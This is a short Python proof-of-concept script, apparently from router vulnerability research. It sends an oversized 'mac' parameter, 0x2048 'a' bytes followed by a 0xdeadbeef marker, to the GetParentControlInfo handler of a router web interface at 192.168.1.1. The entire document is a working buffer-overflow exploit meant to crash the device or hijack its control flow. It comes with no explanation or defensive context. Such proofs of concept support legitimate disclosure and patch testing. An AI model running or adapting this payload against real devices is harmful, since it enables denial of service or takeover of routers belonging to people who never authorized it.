import requests
def send_payload(url, payload):
    params={'mac':payload}
    response = requests.get(url, params=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x2048+b"\xef\xbe\xad\xde"
url="http://192.168.1.1/goform/GetParentControlInfo"
send_payload(url, payload)   